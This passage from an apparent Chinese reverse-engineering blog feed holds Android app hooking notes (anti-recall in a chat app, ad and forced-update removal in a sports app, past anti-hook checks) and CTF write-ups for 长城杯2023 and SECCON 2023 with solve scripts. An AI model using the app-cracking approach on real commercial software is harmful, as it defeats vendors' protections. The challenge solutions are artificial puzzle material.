    new_code = fix_invalid(f)
    code_obj = recompile(f, new_code)
    setattr(RightBack, f.__name__, code_obj)

    byc = open(f.__name__ + &#39;.pyc&#39;, &#39;wb&#39;)
    byc.write(b&#39;\x61\x0D\x0D\x0A\x00\x00\x00\x00\xC1\xC5\xC0\x64\x9C\x27\x00\x00&#39;)
    marshal.dump(code_obj, byc)
    byc.close()
    #raw_code = f.__code__.co_code
    #data = data.replace(raw_code, new_code)

file.write(data)
file.close()
</code></pre>
]]></content>
      <tags>
        <tag>re python</tag>
      </tags>
  </entry>
  <entry>
    <title>hook某聊天软件lab</title>
    <url>/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/</url>
    <content><![CDATA[<h6 id="起因是在学安卓逆向，而且自己水平太低，打算练练手。恰巧某友的校内lab做了类似的东西，羡慕，遂打算动手尝试复现"><a href="#起因是在学安卓逆向，而且自己水平太低，打算练练手。恰巧某友的校内lab做了类似的东西，羡慕，遂打算动手尝试复现" class="headerlink" title="起因是在学安卓逆向，而且自己水平太低，打算练练手。恰巧某友的校内lab做了类似的东西，羡慕，遂打算动手尝试复现"></a>起因是在学安卓逆向，而且自己水平太低，打算练练手。恰巧某友的校内lab做了类似的东西，羡慕，遂打算动手尝试复现</h6><span id="more"></span>

<h4 id="一、某绿色软件防撤回"><a href="#一、某绿色软件防撤回" class="headerlink" title="一、某绿色软件防撤回"></a>一、某绿色软件防撤回</h4><p>首先搜索相关字串<code>revoke</code>，找到一个<code>RevokeMsgEvent</code>，看起来很像，然后翻找代码，发现了这个listener用于接收一个撤回消息事件</p>
<h5 id><a href="#" class="headerlink" title></a><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230809174202432.png" alt="image-20230809174202432"></h5><p>观察这里的callback函数，先赋值到一个叫做<code>revokeMsgEvent2</code>的class上（什么鬼命名…但是看起来可能挺重要的，marked一下）</p>
<p>接着合法性检测，不需要管</p>
<p>p0.D的声明如下</p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230809175148467.png" alt="image-20230809175148467"></p>
<p>猜测这里是通知一栏，将原通知的属性修改为已撤回的属性，两者参数string声明如下：</p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230809175818647.png" alt="image-20230809175818647"></p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230809175830933.png" alt="image-20230809175830933"></p>
<p>不好懂，接着往下看</p>
<p>可以明确的是这里的class h是和撤回相关操作的类，结合下面的调用，猜测这里就是集中处理撤回用的函数（对本地数据库进行了一些操作与删除），查看一下其声明，均是revoke的相关操作，那合理来说不会影响正常的流程，直接hook就行。</p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230809185208738.png" alt="image-20230809185208738"></p>
<p>这里试一下<code>frida</code>脚本hook的操作。</p>
<p>首先是这里只有arm的包，暂时没有物理机做测试，可以用的方案有三个：AS、qemu、商业模拟器</p>
<table>
<thead>
<tr>
<th>AS</th>
<th>qemu</th>
<th>商业模拟器</th>
</tr>
</thead>
<tbody><tr>
<td>开发必备</td>
<td>比较折腾，但是稍微比AS效率好一点</td>
<td>运行比较流畅，但是版本选择有限，而且还有很多版本和hyperV犯冲，选择更加有限</td>
</tr>
</tbody></table>
<p>这里选择先用AS尝试了一下，配置如下（一点点尝试可以运行起来的arm架构）：<img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810132624458.png" alt="image-20230810132624458"></p>
<p>巨慢无比，还不支持android studio的一些便携操作，结果和绿色软件的so还不兼容…麻了…</p>
<p>尝试使用mumuX（亲测只有mumux在本机可以和WSL2共存，其他声称支持hyperV的都会出问题，待修复），会被检测环境，来尝试配一下qemu</p>
<p>疑似不太行，毕竟AS也是基于qemu的，该卡照样卡（据说mac上用as模拟android非常流畅……）</p>
<p>然后发现微软自家的vs有安卓模拟器，那来尝试一下下</p>
<h6 id="to-be-continue"><a href="#to-be-continue" class="headerlink" title="- to be continue"></a>- to be continue</h6><h4 id="二、某运动软件广告消除以及强制更新破解"><a href="#二、某运动软件广告消除以及强制更新破解" class="headerlink" title="二、某运动软件广告消除以及强制更新破解"></a>二、某运动软件广告消除以及强制更新破解</h4><h6 id="之前队里一直有跌说加了壳搞不了，但是感觉好像么有点机会，遂来看看，这里是用的一个旧版本，好像对root的检测没那么严格，但是也能用，后面有空再调一个新版本的"><a href="#之前队里一直有跌说加了壳搞不了，但是感觉好像么有点机会，遂来看看，这里是用的一个旧版本，好像对root的检测没那么严格，但是也能用，后面有空再调一个新版本的" class="headerlink" title="之前队里一直有跌说加了壳搞不了，但是感觉好像么有点机会，遂来看看，这里是用的一个旧版本，好像对root的检测没那么严格，但是也能用，后面有空再调一个新版本的"></a><del>之前队里一直有跌说加了壳搞不了，但是感觉好像么有点机会，遂来看看，这里是用的一个旧版本，好像对root的检测没那么严格，但是也能用，后面有空再调一个新版本的</del></h6><p>通过搜索引擎可以找到一个文档，<a href="https://www.csjplatform.com/supportcenter/5398">开屏广告-Android集成文档-开发测试-穿山甲广告平台 (csjplatform.com)</a>，这个app的部分广告大概就是基于这个开发的</p>
<p>大概定位到这个类上，是广告加载用的类</p>
<h5 id="-1"><a href="#-1" class="headerlink" title></a><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810164814274.png" alt="image-20230810164814274"></h5><p>合理来说把这里hook一下</p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810165617746.png" alt="image-20230810165617746"></p>
<p>就能消掉大部分和ad相关的事件了</p>
<p>但是接着看下去就感觉事情不对头了，这里的<code>com.fighter.wrapper</code>疑似只是一个ad的处理方法，仔细看左边的包还有一万个不同公司的ad……破软件没啥功能，集成的广告不少</p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810171514620.png" alt="image-20230810171514620"></p>
<p>而且后面很多广告用的不是这个方法，那就是不能在这层hook了，会累死自己，最好的解决方法还是在调用这n个广告类前就掐掉源头</p>
<p>可以搜索发现<code>com.zjwh</code>应该是这软件自己的包，命名做的手动混淆，全都是oO0啥的…</p>
<p>这里发现了反虚拟环境和反hook的操作，那看来后面有点点不好整的</p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810173613500.png" alt="image-20230810173613500"></p>
<p>另外，可以手动调试发现，apk启动的时候会与server交互获取应用更新信息，然后触发强制更新，交互方法疑似使用的<code>okhttp</code>,但是zjwh包进行了混淆，与服务器也都用的okhttp交互，需要一定工作量找到</p>
<p>进度记录：这里仔细找引用和具体的实现方式</p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810212148480.png" alt="image-20230810212148480"></p>
<p>检测xposed框架是否存在的方法，也需要hook掉</p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810213654727.png" alt="image-20230810213654727"></p>
<p>这个包看起来是比较重要的，下面还有检测攻击等等函数：</p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810214035445.png" alt="image-20230810214035445"></p>
<p>这个包的源码可以找到一个很类似的（虽然只有部分）：</p>
<p><a href="https://mogua.co/view_file/?file=com/ijm/detect/drisk/DRiskNativeTool.java&md5=746753952f66bd8794683d37ccdd2642&type=apk&appname=%E5%BE%97%E7%89%A9&lines=84">DRiskNativeTool.java - 得物.apk源代码分析 - 摸瓜 (mogua.co)</a></p>
<p>然后顺着搜，可以找到<a href="https://www.ijiami.cn/enindex">iJiami - Guarding the Smart World | mobile information security service provider</a>这家公司，专门做安全的，这些安全相关的包就是它家做的了</p>
<h5 id="-2"><a href="#-2" class="headerlink" title></a><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810221152187.png" alt="image-20230810221152187"></h5><p>到这里就要考虑放弃了，毕竟是商业级的加固，就算级别不高，破解再怎么说也要不小的工程量…</p>
]]></content>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>长城杯2023</title>
    <url>/2023/09/13/%E9%95%BF%E5%9F%8E%E6%9D%AF2023/</url>
    <content><![CDATA[<h6 id="PREFACE：RE比较容易"><a href="#PREFACE：RE比较容易" class="headerlink" title="PREFACE：RE比较容易"></a>PREFACE：RE比较容易</h6><h6 id="ps-初赛猛猛做最后是第一，决赛线下直接不会了，赛后仨小时出了re1一小时出的re2，只能说离开网络和gpt的moyaoxue一事无成"><a href="#ps-初赛猛猛做最后是第一，决赛线下直接不会了，赛后仨小时出了re1一小时出的re2，只能说离开网络和gpt的moyaoxue一事无成" class="headerlink" title="ps. 初赛猛猛做最后是第一，决赛线下直接不会了，赛后仨小时出了re1一小时出的re2，只能说离开网络和gpt的moyaoxue一事无成"></a>ps. 初赛猛猛做最后是第一，决赛线下直接不会了，赛后仨小时出了re1一小时出的re2，只能说离开网络和gpt的moyaoxue一事无成</h6><span id="more"></span>

<p>初赛：</p>
<h3 id="vvm"><a href="#vvm" class="headerlink" title="vvm"></a>vvm</h3><p>简单的vm，opcode很少直接可以看出来逻辑</p>
<p><img src="/2023/09/13/%E9%95%BF%E5%9F%8E%E6%9D%AF2023/image-20230913214608382.png" alt="image-20230913214608382"></p>
<pre><code class="python">enc = [  126,  120,  117,  127,  107,  82,  117,  114,  109,  119,  78,  121,  121,  121,  119,  68,  98,  36,  96,  113,  115,  96,  53,  105]

for i in enc:
    i ^= 0x16
    i -= 2
    print(chr(i),end = &quot;&quot;)
</code></pre>
<h3 id="ezSocket"><a href="#ezSocket" class="headerlink" title="ezSocket"></a>ezSocket</h3><p>字节码逆向，通信过程的sm4和rsa都不需要管，只是信道加解密内容，只需要爆破六位key对比sha256即可</p>
<pre><code class="python">from Crypto.Cipher import DES
import string
import itertools
import base64
import hashlib
# import owiener
if __name__ == &quot;__main__&quot;:
    charset = string.digits + &quot;&quot;
    for i in itertools.product(charset, repeat=6):

        key = &#39;&#39;.join(i)
        key += &#39;ffffffffff&#39;
        key = key.encode()
        a = hashlib.sha256(key).hexdigest().encode()
        if (a == b&#39;fdce9fbba473a2e47c14c72a78dcf62a28f0259847d7910ecb18a0af80983693&#39;):
            print(key)
</code></pre>
<p>决赛</p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h4 id="file"><a href="#file" class="headerlink" title="file"></a>file</h4><p>一个类lz77压缩的压缩算法，改变的地方在于滑块长度固定二</p>
<p>具体规则是：建立缓存</p>
<p><img src="/2023/09/13/%E9%95%BF%E5%9F%8E%E6%9D%AF2023/image-20230916212036353.png" alt="image-20230916212036353"></p>
<p>每次出现新的双字节（两个ascii，即滑块长），则在该字节前面加一bit的’1’，并存入缓冲区，如果在缓存找到已有，则在前面加8bit的’0’，然后下面8bit做填充和寻址（在缓存内找到相应的双字节）</p>
<p>(脚本不全，解压部分是手动试的，因为真正压缩的地方只有两处)：</p>
<pre><code class="python">a=&#39;1011001101011011001011000011011001111011110111001101001011001001011001101001101101001110001001100111011001001001100101001011011001101111011000111001100111001100011001011011001100111001100001001110001011000111001011011011000111001100101001100011001101111001011011001100011011001001001101111011001000000000000110000000000001001000010011010010011010010011001110110001110111110100&#39;

i = 0
flag = &#39;&#39;
j = 0
while(i&lt; len(a)):
    if a[i] == &#39;0&#39;:
        i += 1
        i += 12
    else :
        i += 1
        flag += chr(int(a[i:i+8], 2))
        i += 8

print(flag)


#   flag&#123;4df683d2-7c31-308c-c217-1d7d0817443c&#125;
</code></pre>
<h5 id="your-emb"><a href="#your-emb" class="headerlink" title="your_emb"></a>your_emb</h5><p>一点一点硬看汇编，发现check前面有xor操作，这里的xor应该是getkey访问失败返回得到的，即：<code>connection refused</code></p>
<p><img src="/2023/09/13/%E9%95%BF%E5%9F%8E%E6%9D%AF2023/image-20230916212956794.png" alt="image-20230916212956794"></p>
<pre><code class="python">enc = [  0x05, 0x03, 0x0F, 0x09, 0x1E, 0x5B, 0x12, 0x5C, 0x09, 0x0F,
  0x10, 0x43, 0x56, 0x4B, 0x17, 0x40, 0x56, 0x55, 0x4E, 0x5B,
  0x08, 0x5C, 0x57, 0x4E, 0x15, 0x0D, 0x5C, 0x0D, 0x0D, 0x16,
  0x5C, 0x05, 0x43, 0x41, 0x57, 0x5D, 0x02, 0x59, 0x5D, 0x5C,
  0x50, 0x1E]
key = &#39;connection refused&#39;
for i in range(len(enc)):
    print(chr(enc[i] ^ ord(key[i % len(key)])),end=&#39;&#39;)
    
# flag&#123;8f5fa013-b331-4f22-ad3c-d9c6229a6325&#125;
</code></pre>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>seccon 2023</title>
    <url>/2023/09/18/seccon-2023/</url>
    <content><![CDATA[<h6 id="PREFACE-本来人说和一块看，结果周末事情太多了只能自己做，赛中做了俩，后面只能再慢慢补题qaq"><a href="#PREFACE-本来人说和一块看，结果周末事情太多了只能自己做，赛中做了俩，后面只能再慢慢补题qaq" class="headerlink" title="PREFACE: 本来人说和一块看，结果周末事情太多了只能自己做，赛中做了俩，后面只能再慢慢补题qaq."></a>PREFACE: 本来人说和一块看，结果周末事情太多了只能自己做，赛中做了俩，后面只能再慢慢补题qaq.</h6><h6 id="基本上算是比较少看国外赛，看了一下seccon感觉确实和平时做的差距挺大的，比如这个re很有些misc的感觉，难度还行不算很恶心，但是确实新，希望最近几天能把它复现出来"><a href="#基本上算是比较少看国外赛，看了一下seccon感觉确实和平时做的差距挺大的，比如这个re很有些misc的感觉，难度还行不算很恶心，但是确实新，希望最近几天能把它复现出来" class="headerlink" title="基本上算是比较少看国外赛，看了一下seccon感觉确实和平时做的差距挺大的，比如这个re很有些misc的感觉，难度还行不算很恶心，但是确实新，希望最近几天能把它复现出来"></a>基本上算是比较少看国外赛，看了一下seccon感觉确实和平时做的差距挺大的，比如这个re很有些misc的感觉，难度还行不算很恶心，但是确实新，希望最近几天能把它复现出来</h6><span id="more"></span>

<h4 id="jumpout"><a href="#jumpout" class="headerlink" title="jumpout"></a>jumpout</h4><p>签到题，写了个小混淆反静态看，大概意思是将所有的<code>jmp addr</code>改成类似<code>mov rax, addr; jmp rax</code>的操作，应该是写了个<code>llvm</code>小工具之类的</p>
<p>动调仔细看汇编即可，理论上可以自己修，但是没啥必要（而且也不太会，近期还得学学angr，qaq），这里只是做了三次异或</p>
<p>需要对栈上和寄存器的数据跟的比较清晰，这里的i其实没跟明白但是可以简单猜一下，实在不行就每轮都跟完也能出（~~异或么反正，每轮都拿一个最后值就行其实~~~）</p>
<p>exp:</p>
<pre><code class="python">a = [  0xF6, 0xF5, 0x31, 0xC8, 0x81, 0x15, 0x14, 0x68, 0xF6, 0x35,
  0xE5, 0x3E, 0x82, 0x09, 0xCA, 0xF1, 0x8A, 0xA9, 0xDF, 0xDF,
  0x33, 0x2A, 0x6D, 0x81, 0xF5, 0xA6, 0x85, 0xDF, 0x17]


enc = [  0xF0, 0xE4, 0x25, 0xDD, 0x9F, 0x0B, 0x3C, 0x50, 0xDE, 0x04,
  0xCA, 0x3F, 0xAF, 0x30, 0xF3, 0xC7, 0xAA, 0xB2, 0xFD, 0xEF,
  0x17, 0x18, 0x57, 0xB4, 0xD0, 0x8F, 0xB8, 0xF4, 0x23]

for i in range(len(enc)):
    print(chr(i ^ 0x55 ^ enc[i] ^ a[i]),end=&#39;&#39;)

# SECCON&#123;jump_table_everywhere&#125;
</code></pre>
<h4 id="Sickle"><a href="#Sickle" class="headerlink" title="Sickle"></a>Sickle</h4><p>第一次见这个pickle加载payload反序列化调用shellcode的操作，具体其实还是不太会搞，这题<code>pickletools.dis(payload)</code>得到的结果感觉用处不大，知道有个<code>xor</code>的信息，不知道怎么提取其实（等wp出来再复现复现）但是re么真不能太纠结过程吧，反正fuzz一下，嗯看一下bytes，猜测是一个<code>rsa + xor + 倒序</code>的组合，参数很奇怪n是一个素数（开始以为要打，问了一下密码爷说不用直接可以解）解了第一段发现第二段参数不对，遂注意到<code>xor</code>参数换了，然后么就出了…</p>
<p>看这个flag内容感觉或许确实不太有动调工具，但是应该有方法起码把完整字节码反序列化拿到吧…但是确实没搞出来，晚点看看wp…</p>
<p>exp:</p>
<pre><code class="python">check_values = [
    8215359690687096682,
    1862662588367509514,
    8350772864914849965,
    11616510986494699232,
    3711648467207374797,
    9722127090168848805,
    16780197523811627561,
    18138828537077112905,
]
import gmpy2
from Crypto.Util.number import long_to_bytes

xor = 1244422970072434993

for c in check_values:
    e = 65537
    n = 18446744073709551557
    phi = (18446744073709551557 - 1)
    d = gmpy2.invert(e, phi)
    m = pow(c,d,n)
    print(long_to_bytes(m ^ xor).decode()[::-1],end=&#39;&#39;)
    xor = c
# SECCON&#123;Can_someone_please_make_a_debugger_for_Pickle_bytecode??&#125;
</code></pre>
<h4 id="prefect-flu"><a href="#prefect-flu" class="headerlink" title="prefect-flu"></a>prefect-flu</h4><h6 id="9-17-没出还，很急，感觉确实有点点misc来的"><a href="#9-17-没出还，很急，感觉确实有点点misc来的" class="headerlink" title="9-17,没出还，很急，感觉确实有点点misc来的"></a>9-17,没出还，很急，感觉确实有点点misc来的</h6><p>也是第一次见，dvd iso，没搞清楚怎么提取逻辑</p>
<p>感觉可以参考是这篇：<a href="https://zhuanlan.zhihu.com/p/46518832">蓝光文件解析 - 知乎 (zhihu.com)</a>，但是里面的工具编译不出来，它的文件路径感觉是乱的，还没解决…</p>
<p>用vlc可以运行，点击很多button，会触发check逻辑一段一段播放视频，作为回显，逻辑应该是在<code>BDMV/MovieObject.bdmv</code>里面的（JAR里面明明确实没找到东西……）</p>
<p><code>BDedit</code>可以打开这个bdmv，里面有一定的运行逻辑，但是里面是缺少check flag的逻辑的，目前是还没找到check到底在哪，急急急…</p>
<p><img src="/2023/09/18/seccon-2023/image-20230918105138109.png" alt="image-20230918105138109"></p>
<h6 id="9-18-看了别的师傅的wp，出了，一步之遥…"><a href="#9-18-看了别的师傅的wp，出了，一步之遥…" class="headerlink" title="9-18,看了别的师傅的wp，出了，一步之遥…"></a>9-18,看了别的师傅的wp，出了，一步之遥…</h6><p>导入STREAM中的M2TS到这里的Menu里面，可以看每个button的具体逻辑…</p>
<p><img src="/2023/09/18/seccon-2023/image-20230918160853438.png" alt="image-20230918160853438"></p>
<p>这个<code>Call Object</code>不同的既是正确的flag，猜一下可以得到这个图（偷来的图）</p>
<p><img src="/2023/09/18/seccon-2023/image-20230918161010536.png" alt="image-20230918161010536"></p>
<p>SECCON{</p>
<p>26 11 10 25 38 4 7 12 28 38 10 11 13 28 38 32 24 21 11 38 16 23 13 17 38 31 16 15 2 38 15 25 27 27 38 27 23   </p>
<p>34 33 39</p>
<pre><code class="PYTHON">a = &#39;1234567890QWERTYUIOPASDFGHJKL&#123;ZXCVBNM_-&#125;&#39;
b = [26,11,10,25,38,4,7,12,28,38,10,11,13,28,38,32,24,21,11,38,16,23,13,17,38,31,16,15,2,38,15,25,27,27,38,27,23,34,33,39]
flag = &#39;SECCON&#123;&#39;
for i in b:
    flag += a[i]
print(flag)
# SECCON&#123;JWQH-58EL-QWRL-CGSW-UFRI-XUY3-YHKK-KFBV&#125; 没交过，感觉可能错了一两位？但是确实不想debug了先就这样
</code></pre>
<h4 id="xuyao"><a href="#xuyao" class="headerlink" title="xuyao"></a>xuyao</h4><p>一开始以为混淆的是check部分逻辑，因为确实有点点奇怪</p>
<p>结果混淆的是加密，将SM4的盒换成AES的sbox了（属于看wp看的，确实识别加密这块不熟悉qaq）</p>
<p>回来动调硬看一下可以发现这里<code>Feistel</code>的轮数都不对</p>
<p><img src="/2023/09/18/seccon-2023/image-20230919154214378.png" alt="image-20230919154214378"></p>
<p>这里旋转的位数改了：</p>
<p><img src="/2023/09/18/seccon-2023/image-20230919160104814.png" alt="image-20230919160104814"></p>
<p>然后抄一个r3的exp吧，把表换一下，改天得再重新学学sm4算法了：</p>
<pre><code class="cpp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;
#define SM4_ENCRYPT 1
#define SM4_DECRYPT 0
typedef struct &#123;
    int mode; /*!&lt; encrypt/decrypt */
    unsigned long sk[32]; /*!&lt; SM4 subkeys */
&#125; sm4_context;
void sm4_setkey_enc(sm4_context *ctx, unsigned char key[16]);
void sm4_setkey_dec(sm4_context *ctx, unsigned char key[16]);
void sm4_crypt_ecb(sm4_context *ctx, int mode, int length, unsigned char *input,
    unsigned char *output);
void sm4_crypt_cbc(sm4_context *ctx, int mode, int length, unsigned char iv[16],
    unsigned char *input, unsigned char *output);
#ifndef GET_ULONG_BE
#define GET_ULONG_BE(n, b, i) \
&#123; \
(n) = ((unsigned long)(b)[(i)] &lt;&lt; 24) | \
((unsigned long)(b)[(i) + 1] &lt;&lt; 16) | \
((unsigned long)(b)[(i) + 2] &lt;&lt; 8) | ((unsigned long)(b)[(i) + 3]); \
&#125;
#endif
#ifndef PUT_ULONG_BE
#define PUT_ULONG_BE(n, b, i) \
&#123; \
(b)[(i)] = (unsigned char)((n) &gt;&gt; 24); \
(b)[(i) + 1] = (unsigned char)((n) &gt;&gt; 16); \
(b)[(i) + 2] = (unsigned char)((n) &gt;&gt; 8); \
(b)[(i) + 3] = (unsigned char)((n)); \
&#125;
#endif
#define SHL(x, n) (((x)&amp;0xFFFFFFFF) &lt;&lt; n)
#define ROTL(x, n) (SHL((x), n) | ((x) &gt;&gt; (32 - n)))
#define SWAP(a, b) \
&#123; \
unsigned long t = a; \
a = b; \
b = t; \
t = 0; \
&#125;
static const unsigned char SboxTable[16][16] = &#123;
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B,
    0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0,
    0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26,
    0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2,
    0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0,
    0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED,
    0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F,
    0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5,
    0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC,
    0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14,
    0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C,
    0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D,
    0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F,
    0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E,
    0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11,
    0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F,
    0xB0, 0x54, 0xBB, 0x16&#125;;
static const unsigned long FK[4] = &#123;0xFF324600, 0x4F9A25B8, 0x3CC7477C,
    0x0C0B9ECD&#125;;
static const unsigned long CK[32] = &#123;
    0xEC656287, 0xD9A22031, 0x01C7BCA8, 0xABE7033B, 0x313FE5DC, 0x940FFAD0,
    0x176EDEB8, 0x7C61B20E, 0x9EAD452F, 0x80E2C15B, 0xBA500D7B, 0xA2C0449F,
    0xBC0E774F, 0x3E393763, 0x43D46B3F, 0x2ADEF404, 0xCA884B87, 0x3C953C45,
    0x7CDBDE63, 0x6E995945, 0xB6CF3655, 0x8D60396A, 0x9A496B38, 0x9D87D81B,
    0x36FEDBC9, 0x79882953, 0x10611E15, 0x0030AB3E, 0x12503487, 0x187E21FF,
    0x6D85127E, 0xDF42C76C,
&#125;;
static unsigned char sm4Sbox(unsigned char inch) &#123;
    unsigned char *pTable = (unsigned char *)SboxTable;
    unsigned char retVal = (unsigned char)(pTable[inch]);
    return retVal;
&#125;
static unsigned long sm4Lt(unsigned long ka) &#123;
    unsigned long bb = 0;
    unsigned long c = 0;
    unsigned char a[4];
    unsigned char b[4];
    PUT_ULONG_BE(ka, a, 0)
    b[0] = sm4Sbox(a[0]);
    b[1] = sm4Sbox(a[1]);
    b[2] = sm4Sbox(a[2]);
    b[3] = sm4Sbox(a[3]);
    GET_ULONG_BE(bb, b, 0)
    c = bb ^ (ROTL(bb, 3)) ^ (ROTL(bb, 14)) ^ (ROTL(bb, 15)) ^ (ROTL(bb, 9));
    return c;
&#125;
static unsigned long sm4F(unsigned long x0, unsigned long x1, unsigned long x2,
    unsigned long x3, unsigned long rk) &#123;
    return (x0 ^ sm4Lt(x1 ^ x2 ^ x3 ^ rk));
&#125;
static unsigned long sm4CalciRK(unsigned long ka) &#123;
    unsigned long bb = 0;
    unsigned long rk = 0;
    unsigned char a[4];
    unsigned char b[4];
    PUT_ULONG_BE(ka, a, 0)
    b[0] = sm4Sbox(a[0]);
    b[1] = sm4Sbox(a[1]);
    b[2] = sm4Sbox(a[2]);
    b[3] = sm4Sbox(a[3]);
    GET_ULONG_BE(bb, b, 0)
    rk = bb ^ (ROTL(bb, 11)) ^ (ROTL(bb, 25));
    return rk;
&#125;
static void sm4_setkey(unsigned long SK[32], unsigned char key[16]) &#123;
    unsigned long MK[4];
    unsigned long k[36];
    unsigned long i = 0;
    GET_ULONG_BE(MK[0], key, 0);
    GET_ULONG_BE(MK[1], key, 4);
    GET_ULONG_BE(MK[2], key, 8);
    GET_ULONG_BE(MK[3], key, 12);
    k[0] = MK[0] ^ FK[0];
    k[1] = MK[1] ^ FK[1];
    k[2] = MK[2] ^ FK[2];
    k[3] = MK[3] ^ FK[3];
    for (; i &lt; 32; i++) &#123;
        k[i + 4] = k[i] ^ (sm4CalciRK(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ CK[i]));
        SK[i] = k[i + 4];
    &#125;
&#125;
static void sm4_one_round(unsigned long sk[32], unsigned char input[16],
    unsigned char output[16]) &#123;
    unsigned long i = 0;
    unsigned long ulbuf[36];
    memset(ulbuf, 0, sizeof(ulbuf));
    GET_ULONG_BE(ulbuf[0], input, 0)
    GET_ULONG_BE(ulbuf[1], input, 4)
    GET_ULONG_BE(ulbuf[2], input, 8)
    GET_ULONG_BE(ulbuf[3], input, 12)
    while (i &lt; 32) &#123;
        ulbuf[i + 4] =
        sm4F(ulbuf[i], ulbuf[i + 1], ulbuf[i + 2], ulbuf[i + 3], sk[i]);
        i++;
    &#125;
    PUT_ULONG_BE(ulbuf[35], output, 0);
    PUT_ULONG_BE(ulbuf[34], output, 4);
    PUT_ULONG_BE(ulbuf[33], output, 8);
    PUT_ULONG_BE(ulbuf[32], output, 12);
&#125;
void sm4_setkey_enc(sm4_context *ctx, unsigned char key[16]) &#123;
    ctx-&gt;mode = SM4_ENCRYPT;
    sm4_setkey(ctx-&gt;sk, key);
&#125;
void sm4_setkey_dec(sm4_context *ctx, unsigned char key[16]) &#123;
    int i;
    ctx-&gt;mode = SM4_DECRYPT;
    sm4_setkey(ctx-&gt;sk, key);
    for (i = 0; i &lt; 16; i++) &#123;
        SWAP(ctx-&gt;sk[i], ctx-&gt;sk[31 - i]);
    &#125;
&#125;
void sm4_crypt_ecb(sm4_context *ctx, int mode, int length, unsigned char *input,
    unsigned char *output) &#123;
    while (length &gt; 0) &#123;
        sm4_one_round(ctx-&gt;sk, input, output);
        input += 16;
        output += 16;
        length -= 16;
    &#125;
&#125;
